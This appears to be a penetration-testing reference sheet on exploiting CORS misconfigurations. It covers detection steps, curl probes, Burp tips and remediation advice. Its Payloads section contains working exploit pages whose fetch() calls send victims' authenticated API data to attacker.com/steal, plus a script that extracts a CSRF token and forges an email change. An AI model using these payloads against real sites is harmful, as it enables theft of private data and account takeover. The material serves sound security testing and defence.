# CSRF via CORS Misconfiguration

## Overview
Cross-Origin Resource Sharing (CORS) allows servers to relax the browser's same-origin policy for specific trusted origins. When CORS is misconfigured — particularly by reflecting the `Origin` header value back without validation, or by allowing `null` origin, or by permitting `Access-Control-Allow-Credentials: true` alongside a wildcard or overly broad `Access-Control-Allow-Origin` — an attacker's page can make authenticated cross-origin API requests and, critically, read the responses. This elevates CSRF from "write-only" to full data exfiltration: the attacker can read sensitive data (CSRF tokens, personal info, API secrets) and use it to chain further attacks.

## How It Works
Standard CSRF exploits "blind writes" — the attacker's forged request executes but cannot read the response (same-origin policy blocks it). CORS misconfiguration breaks this restriction. If the target responds with `Access-Control-Allow-Origin: https://attacker.com` and `Access-Control-Allow-Credentials: true`, the attacker's JavaScript can make an authenticated `fetch()` with `credentials: 'include'` and actually read the server's response. This enables reading sensitive API responses containing CSRF tokens, which can then be used to bypass CSRF protection; reading user profile data, payment info, messages; and performing multi-step exploits that first read a CSRF token then use it to forge a privileged request.

## Impact
- Cross-origin data theft: read any API response the victim has access to
- CSRF token extraction, enabling bypass of other CSRF protections
- Two-step account takeover: read CSRF token → forge password change
- Exposure of private data: messages, PII, financial data, secrets
- Equivalent to XSS in terms of data access when `credentials: include` is allowed

## Where to Look
- API responses with `Access-Control-Allow-Origin` header — check the value
- Responses that include `Access-Control-Allow-Credentials: true`
- Responses that mirror the `Origin` request header verbatim
- APIs that allow `Origin: null` (from file:// pages or sandboxed iframes)
- Subdomains listed in the CORS allowlist that may have XSS vulnerabilities
- Mobile app API backends with broad CORS policies
- Development/staging endpoints accidentally exposed with permissive CORS

## Testing Steps
1. Identify API endpoints by browsing the application — check HTTP history for AJAX requests.
2. For each endpoint, send a request with a custom `Origin` header: `Origin: https://evil.com`.
3. Check the response for `Access-Control-Allow-Origin: https://evil.com` — if reflected, CORS is misconfigured.
4. Also check if `Access-Control-Allow-Credentials: true` is present in the same response.
5. Test `Origin: null` — if `Access-Control-Allow-Origin: null` is returned, it's exploitable from sandboxed iframes.
6. Test partial-match bypasses: `Origin: https://victim.com.evil.com`, `Origin: https://notevil.victim.com`.
7. Build an exploit page (see Payloads) to verify the response body is readable cross-origin.
8. Identify what sensitive data is exposed in the readable responses.
9. Check for CSRF tokens in responses that are now readable due to CORS — chain to full account takeover.

## Payloads / Techniques

**Test CORS reflection with cURL:**
```bash
# Test arbitrary origin reflection:
curl -si -H "Origin: https://evil.com" \
     https://victim.com/api/userinfo | grep -i 'access-control'

# Expected vulnerable response:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true

# Test null origin:
curl -si -H "Origin: null" \
     https://victim.com/api/userinfo | grep -i 'access-control'
```

**Test subdomain bypass:**
```bash
curl -si -H "Origin: https://evil.victim.com" \
     https://victim.com/api/userinfo | grep -i 'access-control'

curl -si -H "Origin: https://victim.com.evil.com" \
     https://victim.com/api/userinfo | grep -i 'access-control'
```

**CORS exploit — read API response cross-origin:**
```html
<!DOCTYPE html>
<html>
<body>
<script>
fetch('https://victim.com/api/userinfo', {
  credentials: 'include'
})
.then(r => r.text())
.then(data => {
  fetch('https://attacker.com/steal?d=' + encodeURIComponent(data));
});
</script>
</body>
</html>
```

**Two-step exploit: read CSRF token then forge state-changing request:**
```html
<script>
// Step 1: Read a page containing the CSRF token
fetch('https://victim.com/account/settings', {credentials: 'include'})
.then(r => r.text())
.then(html => {
  var match = html.match(/name="csrf_token"[^>]*value="([^"]+)"/);
  var csrf = match ? match[1] : null;
  
  if (csrf) {
    // Step 2: Use the CSRF token to change the email
    return fetch('https://victim.com/account/change-email', {
      method: 'POST',
      credentials: 'include',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'email=attacker@evil.com&csrf_token=' + csrf
    });
  }
});
</script>
```

**Exploit via null Origin (sandboxed iframe):**
```html
<!DOCTYPE html>
<html>
<body>
<iframe sandbox="allow-scripts allow-forms" srcdoc="
<script>
fetch('https://victim.com/api/sensitive', {credentials: 'include'})
.then(r => r.json())
.then(data => {
  parent.postMessage(JSON.stringify(data), '*');
});
</script>
"></iframe>
<script>
window.addEventListener('message', function(e) {
  fetch('https://attacker.com/steal?d=' + encodeURIComponent(e.data));
});
</script>
</body>
</html>
```

**CORS pre-flight bypass (test if simple requests bypass pre-flight):**
```html
<script>
// Simple requests (no pre-flight): GET, POST with certain content types
fetch('https://victim.com/api/data', {
  method: 'GET',
  credentials: 'include'
  // No custom headers = no pre-flight = simple request
})
.then(r => r.text())
.then(t => console.log(t));
</script>
```

## Burp Suite Tips
- Use **Burp's Scanner** (Pro) — it automatically detects CORS misconfigurations by testing reflected origins.
- In **Repeater**, manually add `Origin: https://evil.com` to any request and check if the response echoes it back with `Access-Control-Allow-Credentials: true`.
- Use the **CORS* (Additional CORS Checks)** Burp extension for comprehensive CORS testing including partial-match bypasses.
- In **Proxy HTTP history**, search responses for `Access-Control-Allow-Origin` and `Access-Control-Allow-Credentials` to quickly identify all CORS-enabled endpoints.
- Build a multi-step exploit using **Burp's browser** with the attacker page served locally to verify full data readability.
- Use **Logger++** with a filter rule to highlight all responses containing CORS headers.

## Tools
- Burp Suite Pro (Scanner, Repeater, CORS extension)
- CORStest — https://github.com/RUB-NDS/CORStest
- CORS Scanner — https://github.com/chenjj/CORScanner
- cors-poc — https://github.com/nickvdyck/cors-poc
- curl (manual origin header testing)
- Corsy — https://github.com/s0md3v/Corsy

## Remediation
- **Explicit allowlist**: Maintain a strict allowlist of allowed origins. Validate the `Origin` header against this list exactly — do not use prefix/suffix matching or regex that can be bypassed.
- **Do not reflect verbatim**: Never set `Access-Control-Allow-Origin` to the raw value of the `Origin` request header without validating it against the allowlist.
- **Restrict `credentials: true`**: Only set `Access-Control-Allow-Credentials: true` for endpoints that genuinely need cross-origin authenticated access; pair it with a strict specific origin, not a wildcard.
- **Prohibit `null` origin**: Do not whitelist `null` as an allowed origin; it can be triggered from sandboxed iframes on attacker pages.
- **Limit exposed endpoints**: Apply CORS headers only to endpoints that legitimately require cross-origin access; API endpoints returning sensitive data should default to same-origin only.
- **Combine with CSRF tokens**: CORS does not replace CSRF tokens for state-changing operations — use both layers.
- **Pre-flight for non-simple requests**: Ensure that `OPTIONS` pre-flight responses are correctly validated and do not over-permit methods or headers.

## References
https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties
https://portswigger.net/web-security/cors
https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html
https://owasp.org/www-community/attacks/csrf
